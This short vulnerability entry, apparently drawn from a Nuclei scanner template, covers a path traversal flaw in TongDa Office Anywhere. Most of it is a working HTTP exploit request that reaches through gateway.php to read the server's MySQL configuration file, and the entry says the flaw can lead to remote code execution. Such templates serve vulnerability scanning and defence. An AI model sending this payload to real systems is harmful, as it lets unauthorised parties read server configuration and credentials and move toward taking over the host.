# Vulnerability: Office Anywhere TongDa - Path Traversal
**Classification:** CWE-23
**Source:** Nuclei Template (`tongda-path-traversal.yaml`)

## Description
Office Anywhere (OA) is susceptible to path traversal vulnerabilities which can be leveraged to perform remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /ispirit/interface/gateway.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

json={"url":"/general/../../mysql5/my.ini"}
```

